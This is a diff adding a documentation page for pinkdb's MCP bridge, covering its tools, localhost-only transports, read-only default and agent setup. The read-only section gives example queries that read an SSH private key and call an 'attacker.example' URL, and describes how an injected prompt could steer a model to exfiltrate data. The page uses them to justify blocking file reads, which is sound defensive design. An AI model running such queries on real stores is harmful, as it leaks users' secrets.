@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Agents and MCP — pinkdb</title>
+<meta name="description" content="Serve a store to an MCP client: the pinkdb-mcp extension, its tools and JSON Schemas, stdio and localhost HTTP transports, the read-only default, the extension ABI additions, and connecting an agent.">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#F7F1E8" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1B1815" media="(prefers-color-scheme: dark)">
+<link rel="canonical" href="https://pinkdb-docs.defaultcms.workers.dev/docs/agents.html">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="pinkdb docs">
+<meta property="og:title" content="Agents and MCP — pinkdb">
+<meta property="og:description" content="Serve a store to an MCP client: the pinkdb-mcp extension, its tools and JSON Schemas, stdio and localhost HTTP transports, the read-only default, the extension ABI additions, and connecting an agent.">
+<meta property="og:url" content="https://pinkdb-docs.defaultcms.workers.dev/docs/agents.html">
+<meta property="og:image" content="https://pinkdb-docs.defaultcms.workers.dev/assets/og.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="pinkdb — a mini DuckDB in Rust. Docs, extensions, lake, bindings.">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="../assets/favicon.png" sizes="64x64" type="image/png">
+<link rel="apple-touch-icon" href="../assets/favicon.png">
+<link rel="preload" href="../assets/fonts/public-sans.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="../assets/fonts/bricolage-grotesque.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="../assets/style.css">
+<script data-theme-script>
+/* Theme: follows the OS until the visitor picks one; the choice is kept in
+   localStorage and applied before first paint. Without JS the controls stay
+   hidden and the page simply follows prefers-color-scheme. */
+(function () {
+  var KEY = "pinkdb-theme";
+  var root = document.documentElement;
+  var media = window.matchMedia("(prefers-color-scheme: dark)");
+  var mode = "system";
+  try {
+    var saved = localStorage.getItem(KEY);
+    if (saved === "light" || saved === "dark") mode = saved;
+  } catch (e) {}
+
+  function effective() { return mode === "system" ? (media.matches ? "dark" : "light") : mode; }
+
+  function apply() {
+    if (mode === "system") root.removeAttribute("data-theme");
+    else root.setAttribute("data-theme", mode);
+    var dark = effective() === "dark";
+    var toggles = document.querySelectorAll("[data-theme-toggle]");
+    for (var i = 0; i < toggles.length; i++) {
+      toggles[i].setAttribute("aria-pressed", String(dark));
+      toggles[i].setAttribute("aria-label", dark ? "Switch to light theme" : "Switch to dark theme");
+      toggles[i].title = dark ? "Switch to light theme" : "Switch to dark theme";
+    }
+    var choices = document.querySelectorAll("[data-theme-choice]");
+    for (var j = 0; j < choices.length; j++) {
+      choices[j].setAttribute("aria-pressed", String(choices[j].getAttribute("data-theme-choice") === mode));
+    }
+  }
+
+  function choose(next) {
+    mode = next;
+    try {
+      if (mode === "system") localStorage.removeItem(KEY);
+      else localStorage.setItem(KEY, mode);
+    } catch (e) {}
+    // Switch in one frame: no per-element colour transitions.
+    root.classList.add("theme-switching");
+    apply();
+    void root.offsetWidth;
+    requestAnimationFrame(function () { root.classList.remove("theme-switching"); });
+  }
+
+  apply();
+  if (media.addEventListener) media.addEventListener("change", apply);
+
+  document.addEventListener("DOMContentLoaded", function () {
+    var controls = document.querySelectorAll("[data-theme-toggle], .theme-switch");
+    for (var i = 0; i < controls.length; i++) controls[i].hidden = false;
+    document.addEventListener("click", function (event) {
+      var target = event.target.closest("[data-theme-toggle], [data-theme-choice]");
+      if (!target) return;
+      if (target.hasAttribute("data-theme-toggle")) choose(effective() === "dark" ? "light" : "dark");
+      else choose(target.getAttribute("data-theme-choice"));
+    });
+    apply();
+  });
+})();
+</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="container header-row">
+    <a class="brand" href="../"><span class="brand-dot" aria-hidden="true"></span>pinkdb</a>
+    <nav class="site-nav" aria-label="Site">
+      <ul>
+        <li><a href="getting-started" class="active">Docs</a></li>
+        <li><a href="guide-csv-to-lake">Guides</a></li>
+        <li><a href="bindings">API</a></li>
+        <li><a href="../playground">Playground</a></li>
+        <li><a href="../extensions">Extensions</a></li>
+        <li><a href="roadmap">Roadmap</a></li>
+      </ul>
+    </nav>
+    <div class="header-actions">
+    <button class="theme-toggle" type="button" data-theme-toggle hidden aria-label="Switch theme">
+      <svg class="i-moon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M20.5 14.2A8.5 8.5 0 0 1 9.8 3.5a8.5 8.5 0 1 0 10.7 10.7z"/></svg>
+      <svg class="i-sun" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2.5v2M12 19.5v2M2.5 12h2M19.5 12h2M5.3 5.3l1.4 1.4M17.3 17.3l1.4 1.4M5.3 18.7l1.4-1.4M17.3 6.7l1.4-1.4"/></g></svg>
+    </button>
+    <a class="nav-out" href="https://github.com/openlearnia/pinkdb" rel="noopener">GitHub&nbsp;&#8599;</a>
+    </div>
+  </div>
+</header>
+<main id="main">
+<div class="container docs-shell has-toc">
+<aside class="sidebar">
+<input class="sidebar-toggle-cb" type="checkbox" id="sidebar-toggle">
+<label class="sidebar-toggle" for="sidebar-toggle">
+<span class="sidebar-toggle-icon" aria-hidden="true"></span>
+<span class="sidebar-toggle-label">Docs</span>
+<span class="sidebar-toggle-current">Agents and MCP</span>
+<span class="sidebar-toggle-arrow" aria-hidden="true"></span></label>
+<nav class="sidebar-nav" aria-label="Documentation">
+<div class="side-group">
+<p class="side-group-title">Start here</p>
+<ul>
+<li><a href="getting-started">Getting started</a></li>
+<li><a href="install">Install</a></li>
+<li><a href="docker">Docker</a></li>
+</ul>
+</div>
+<div class="side-group">
+<p class="side-group-title">Guides</p>
+<ul>
+<li><a href="guide-csv-to-lake">CSV to a lake</a></li>
+<li><a href="guide-s3-lake">S3 / R2 lakes</a></li>
+<li><a href="guide-encryption">Encrypted databases</a></li>
+<li><a href="guide-durable-multiprocess">Multi-process writers</a></li>
+<li><a href="guide-embedding">Embedding</a></li>
+</ul>
+</div>
+<div class="side-group">
+<p class="side-group-title">Reference</p>
+<ul>
+<li><a href="cli">CLI &amp; REPL</a></li>
+<li><a href="sql">SQL</a></li>
+<li><a href="dialect">SQL dialect</a></li>
+<li><a href="persistence">Persistence</a></li>
+<li><a href="lake">Lake</a></li>
+<li><a href="server">Server</a></li>
+<li><a href="agents" class="active" aria-current="page">Agents and MCP</a></li>
+</ul>
+</div>
+<div class="side-group">
+<p class="side-group-title">APIs</p>
+<ul>
+<li><a href="bindings">Bindings overview</a></li>
+<li><a href="api-rust">Rust</a></li>
+<li><a href="api-c">C</a></li>
+<li><a href="api-python">Python</a></li>
+<li><a href="api-go">Go</a></li>
+</ul>
+</div>
+<div class="side-group">
+<p class="side-group-title">Extensions</p>
+<ul>
+<li><a href="extensions">Using extensions</a></li>
+<li><a href="../extensions">Extension catalog</a></li>
+</ul>
+</div>
+<div class="side-group">
+<p class="side-group-title">Project</p>
+<ul>
+<li><a href="roadmap">Roadmap</a></li>
+<li><a href="changelog">Changelog</a></li>
+</ul>
+</div>
+</nav>
+</aside>
+<article class="doc-main">
+<p class="eyebrow">Reference</p>
+<h1>Agents and MCP</h1>
+
+<p class="doc-meta">pinkdb ships an <a href="docs/extensions">extension</a>
+that speaks the <a href="https://modelcontextprotocol.io">Model Context
+Protocol</a>, so an agent — pi, Claude Code, fx, any MCP client — can query a
+store with the same compact Markdown results and JSON errors as the
+<code>-agent</code> CLI mode. pinkdb contains no model code: the client brings
+the reasoning, pinkdb runs the SQL.</p>
+
+<h2 id="quick-start">Quick start<a class="anchor" href="#quick-start" aria-label="Permalink: Quick start">#</a></h2>
+
+<div class="codeblock"><div class="codeblock-head"><span class="codeblock-lang">Shell</span></div><pre class="code" data-lang="sh"><code><span class="tok-c"># build the bridge next to the CLI</span>
+cargo build <span class="tok-f">--release</span> <span class="tok-f">-p</span> pinkdb-cli <span class="tok-f">-p</span> pinkdb-mcp
+
+<span class="tok-c"># one flag: open a store and serve one MCP client over stdio (read-only)</span>
+./target/release/pinkdb <span class="tok-f">--mcp</span> sales.pink
+
+<span class="tok-c"># or load it in an interactive session</span>
+./target/release/pinkdb sales.pink
+pinkdb&gt; LOAD EXTENSION <span class="tok-s">'./target/release/libpinkdb_mcp.dylib'</span>;
+pinkdb&gt; .mcp serve stdio              <span class="tok-c"># one client on this terminal's pipes</span>
+pinkdb&gt; .mcp serve http 7801          <span class="tok-c"># streamable HTTP on 127.0.0.1:7801</span>
+pinkdb&gt; .mcp serve stdio allow-writes <span class="tok-c"># let the client change the store</span></code></pre></div>
+
+<p><code>--mcp</code> looks for <code>libpinkdb_mcp</code> next to the
+<code>pinkdb</code> executable (or the install directory); pass
+<code>--mcp-extension PATH</code> to point at another build.</p>
+
+<h2 id="transports">Transports<a class="anchor" href="#transports" aria-label="Permalink: Transports">#</a></h2>
+
+<ul>
+  <li><strong>stdio</strong> — the default, and what a client's
+  <code>command</code>/<code>args</code> config uses.</li>
+  <li><strong>streamable HTTP</strong> — <code>.mcp serve http PORT</code> binds
+  <code>127.0.0.1:PORT</code> only. The extension refuses any other address
+  before it starts: an MCP bridge runs the host's SQL under the host's
+  identity, so it is not something to expose on a network interface.</li>
+</ul>
+
+<h2 id="tools">Tools<a class="anchor" href="#tools" aria-label="Permalink: Tools">#</a></h2>
+
+<p>Every tool has a precise JSON Schema and a one-line description written for
+a model deciding what to call next.</p>
+
+<table>
+  <thead>
+    <tr><th>Tool</th><th>Argument</th><th>What it returns</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>query</code></td><td><code>sql</code></td>
+        <td>One statement as compact Markdown: a table of at most 100 rows with
+        the true row count, or a JSON error. The statement runs under the
+        host's row, byte and time budget, and a truncated result ends with a
+        <code>… N more rows (M total)</code> notice.</td></tr>
+    <tr><td><code>describe</code></td><td><code>table</code></td>
+        <td>Columns, types and nullability as <code>DESCRIBE</code> reports
+        them.</td></tr>
+    <tr><td><code>tables</code></td><td><code>database?</code></td>
+        <td>Every table in the current (or named) database,
+        <code>SHOW TABLES</code>.</td></tr>
+    <tr><td><code>databases</code></td><td>—</td>
+        <td>The databases in the session, <code>SHOW DATABASES</code>.</td></tr>
+    <tr><td><code>explain</code></td><td><code>sql</code></td>
+        <td>The plan, including the wave-99 cost hint
+        (<code>~N rows</code>) so a model can tell a scan from a lookup.</td></tr>
+    <tr><td><code>lake_tables</code></td><td><code>catalog</code></td>
+        <td>Tables in a lake catalog with their row counts.</td></tr>
+    <tr><td><code>lake_versions</code></td><td><code>catalog</code></td>
+        <td>Snapshots: version, time, operation and row counts.</td></tr>
+    <tr><td><code>lake_changes</code></td><td><code>catalog</code>,
+        <code>table</code>, <code>from?</code>, <code>to?</code></td>
+        <td>Inserted and deleted rows in a version range (default: the whole
+        history).</td></tr>
+  </tbody>
+</table>
+
+<p>The lake tools need a CLI build with the <code>pinklake</code> feature and
+work on a local catalog path or the
+<code>pink:</code>/<code>sqlite:</code>/<code>postgres://</code> catalog URLs
+the <a href="docs/lake">lake layer</a> accepts. They are read-only even in
+an <code>allow-writes</code> session: commit, merge and expire need a
+<code>.pink</code> store that no other session owns, so they stay CLI
+operations.</p>
+
+<h2 id="read-only-by-default">Read-only by default<a class="anchor" href="#read-only-by-default" aria-label="Permalink: Read-only by default">#</a></h2>
+
+<p>The host — not the extension — decides what a statement may do. A
+read-only bridge refuses, with a one-line JSON error:</p>
+
+<ul>
+  <li>DML and DDL (<code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>,
+  <code>CREATE</code>, <code>DROP</code>, …);</li>
+  <li><code>COPY … TO</code>, which writes files outside the store;</li>
+  <li><code>LOAD EXTENSION</code>, which loads native code;</li>
+  <li><code>ATTACH …</code> in a write mode;</li>
+  <li>lake commit and maintenance statements;</li>
+  <li><code>SET</code> of security settings;</li>
+  <li><code>read_csv</code>, <code>read_parquet</code> and bare paths in
+  <code>FROM</code>, which read external files and URLs.</li>
+</ul>
+
+<p><code>--allow-writes</code> (<code>.mcp serve … allow-writes</code>) lifts
+the write policy, and every statement then still runs under the engine's
+grants, read-only transactions and the same limits.</p>
+
+<p>Reading files and URLs is a separate switch, because a query alone can leak
+data: <code>read_csv('/home/u/.ssh/id_rsa')</code> or
+<code>read_parquet('https://attacker.example/?d=…')</code> in a
+<code>SELECT</code> is an exfiltration and SSRF channel once an injected
+prompt steers the model. The host binds the statement and refuses it with
+<code>{"error":…,"kind":"permission"}</code> unless the session was started
+with <code>--mcp-allow-files</code> (<code>.mcp serve … allow-files</code>);
+<code>--allow-writes</code> does not imply it. A bridge that serves a
+<code>pinkdb-server</code> store has no such policy check — the login's grants
+decide, and file scans are administrator-only there.</p>
+
+<p> On a store with users, run the
+bridge under a login that may read: <code>pinkdb-server --mcp-extension …</code>
+requires <code>--mcp-user NAME</code> and <code>PINKDB_MCP_PASSWORD</code> on
+such a store and serves the server's own store over
+<code>127.0.0.1</code>.</p>
+
+<h2 id="the-extension-abi">The extension ABI<a class="anchor" href="#the-extension-abi" aria-label="Permalink: The extension ABI">#</a></h2>
+
+<p>Two additive capabilities make this possible without raw pointers crossing
+the boundary, and both are optional, so every ABI v1 extension loads
+unchanged:</p>
+
+<ul>
+  <li><strong>A statement callback.</strong> The extension hands the host SQL
+  text and receives text back — agent Markdown, or a JSON error. The host
+  applies limits, grants and the read-only policy; no engine structure is
+  shared.</li>
+  <li><strong>A serve entry point</strong> (<code>pinkdb_ext_serve</code>).
+  The host passes the API, a transport descriptor
+  (<code>stdio</code> or <code>http:HOST:PORT</code>) and an options string,
+  and gets control back when the client disconnects.</li>
+</ul>
+
+<p>Both are detected by symbol presence. The ABI stays major version 1 with
+minor version 2 (<code>PINKDB_EXT_ABI_MINOR</code>), so a v1 extension keeps
+loading unchanged. A library that is serving cannot be loaded again, and the loader's
+path rules still apply. The Rust SDK exposes
+<code>HostSession</code> and <code>pinkdb_abi_exports_with_serve!</code>; the
+C header and the language SDKs are regenerated with the next SDK release.</p>
+
+<h2 id="connecting-an-agent">Connecting an agent<a class="anchor" href="#connecting-an-agent" aria-label="Permalink: Connecting an agent">#</a></h2>
+
+<p>The bridge is a standard MCP server, so a client needs no adapter or
+package, only one line of configuration:</p>
+
+<div class="codeblock"><div class="codeblock-head"><span class="codeblock-lang">Shell</span></div><pre class="code" data-lang="sh"><code>pi mcp add pinkdb -- pinkdb <span class="tok-f">--mcp</span> store.pink       <span class="tok-c"># pi</span>
+claude mcp add pinkdb -- pinkdb <span class="tok-f">--mcp</span> store.pink   <span class="tok-c"># Claude Code</span></code></pre></div>
+
+<h2 id="a-transcript">A transcript<a class="anchor" href="#a-transcript" aria-label="Permalink: A transcript">#</a></h2>
+
+<div class="codeblock"><div class="codeblock-head"><span class="codeblock-lang">Output</span></div><pre class="code" data-lang="text"><code>agent → query {"sql": "SELECT c.name, SUM(l.quantity * l.price) AS revenue
+                      FROM lineitem l JOIN customers c ON c.id = l.customer_id
+                      GROUP BY c.name ORDER BY revenue DESC LIMIT 3"}
+
+| c.name:VARCHAR | revenue:BIGINT |
+|---|---|
+| Echo | 1000 |
+| Acme | 400 |
+| Cedar | 60 |</code></pre></div>
+
+<p>The model gets the same answer a person would, in the form a context
+window can afford — no JSON envelope per row, and an explicit count when the
+result had to be cut.</p>
+
+<footer class="doc-footer">
+<nav class="pager" aria-label="Previous and next"><a class="pager-link prev" href="server"><span class="pager-dir">Previous</span><span class="pager-title">Server</span></a><a class="pager-link next" href="bindings"><span class="pager-dir">Next</span><span class="pager-title">Bindings overview</span></a></nav>
+<p class="edit-link"><a href="https://github.com/openlearnia/pinkdb/blob/main/website/src/pages/agents.html" rel="noopener">Edit this page on GitHub</a></p>
+</footer>
+</article>
+<nav class="toc" aria-label="On this page">
+<p class="toc-title">On this page</p>
+<ul>
+  <li><a href="#quick-start">Quick start</a></li>
+  <li><a href="#transports">Transports</a></li>
+  <li><a href="#tools">Tools</a></li>
+  <li><a href="#read-only-by-default">Read-only by default</a></li>
+  <li><a href="#the-extension-abi">The extension ABI</a></li>
+  <li><a href="#connecting-an-agent">Connecting an agent</a></li>
+  <li><a href="#a-transcript">A transcript</a></li>
+</ul>
+<p class="toc-top"><a href="#main">Back to top &#8593;</a></p>
+</nav>
+</div>
+</main>
+<footer class="site-footer">
+  <div class="container footer-row">
+    <p>pinkdb — an embedded analytical SQL database in Rust.</p>
+    <p class="colophon" aria-hidden="true">soft data-zine · self-hosted type · no trackers</p>
+    <div class="theme-switch" role="group" aria-label="Paper edition" hidden>
+      <span class="theme-switch-label" aria-hidden="true">edition</span>
+      <button type="button" data-theme-choice="system" aria-pressed="true">Auto</button>
+      <button type="button" data-theme-choice="light" aria-pressed="false">Day</button>
+      <button type="button" data-theme-choice="dark" aria-pressed="false">Night</button>
+    </div>
+    <p><a href="../docs/getting-started">Docs</a> · <a href="../extensions">Extensions</a> · <a href="../docs/changelog">Changelog</a> · <a href="https://github.com/openlearnia/pinkdb" rel="noopener">Source on GitHub</a> · <a href="https://github.com/openlearnia/pinkdb/blob/main/ROADMAP.md" rel="noopener">Engineering log</a></p>
+  </div>
+</footer>
+</body>
+</html>
